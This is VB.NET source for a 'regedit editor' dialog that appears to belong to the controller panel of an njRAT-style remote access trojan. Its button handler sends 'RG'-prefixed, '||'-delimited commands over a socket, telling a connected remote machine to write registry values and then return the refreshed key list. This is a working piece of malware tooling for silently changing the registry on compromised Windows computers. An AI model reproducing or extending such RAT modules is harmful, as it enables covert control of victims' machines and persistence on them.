Imports Microsoft.Win32
Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System
Imports System.ComponentModel
Imports System.Text
Imports Microsoft.VisualBasic
Imports System.Windows.Forms
Imports System.Diagnostics


'coded by pjoao1578
'coded njq8
'v3
Public Class Rgv
#Region "Rgv"
    Public Path As String
    Public sock As Integer
    Dim yy As String = "||" 'yy = senha "||"
#End Region

    Private Sub Rgv_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try 'exit

        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Rgv_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try 'exit

        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Rgv_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Function Typ(ByVal t As String) As Integer
        Try
            Dim num As Integer
            Dim str As String = t.ToLower
            If (str = RegistryValueKind.Binary.ToString.ToLower) Then
                Return 3
            End If
            If (str = RegistryValueKind.DWord.ToString.ToLower) Then
                Return 4
            End If
            If (str = RegistryValueKind.ExpandString.ToString.ToLower) Then
                Return 2
            End If
            If (str = RegistryValueKind.MultiString.ToString.ToLower) Then
                Return 7
            End If
            If (str = RegistryValueKind.QWord.ToString.ToLower) Then
                Return 11
            End If
            If (str = RegistryValueKind.String.ToString.ToLower) Then
                Return 1
            End If
            Return num
        Catch ex As Exception
            Form1.ListBox1.Items.Add("Erro No Regedit Editor !")
        End Try
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        'modific
        Form1.s.Send(sock, "RG" & yy & "!" & yy & Path & yy & Me.TextBox1.Text & yy & Me.TextBox2.Text & yy & Typ(Me.ComboBox1.Text))

        'updeter list
        If (Not Reg.RGk.SelectedNode Is Nothing) Then
            Form1.s.Send(sock, "RG" & yy & "~" & yy & Reg.RGk.SelectedNode.FullPath & "\")
            Reg.RGLIST.Enabled = False
            Reg.RGk.Enabled = False
        End If

        Try 'exit
            Me.Close()
        Catch ex As Exception 'clean erros
            Form1.ListBox1.Items.Add("Erro Ao Salvar Regedit Editor !")
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub
End Class